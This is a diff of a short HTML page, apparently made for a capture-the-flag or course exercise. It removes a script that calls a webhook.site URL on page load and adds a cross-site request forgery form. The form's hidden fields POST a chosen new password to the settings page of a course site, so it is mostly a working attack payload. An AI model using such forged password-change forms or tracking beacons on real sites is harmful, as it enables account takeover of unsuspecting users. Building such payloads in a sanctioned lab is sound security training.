@@ -1,16 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CTF Test</title>
-</head>
 <body>
-  <h1>CTF test page</h1>
-  <p>Page loaded successfully.</p>
-
-  <script>
-    fetch("https://webhook.site/590bf771-7799-401b-bb48-0f7127dc55d2?event=page_loaded", {
-      mode: "no-cors"
-    });
-  </script>
+  <h2>CSRF test</h2>
+  <form action="https://cats.is-course.ru/settings" method="POST">
+    <input type="hidden" name="password" value="CatsForest2026!Secure2">
+    <input type="hidden" name="confirm-password" value="CatsForest2026!Secure2">
+    <button type="submit">Test</button>
+  </form>
 </body>
 </html>
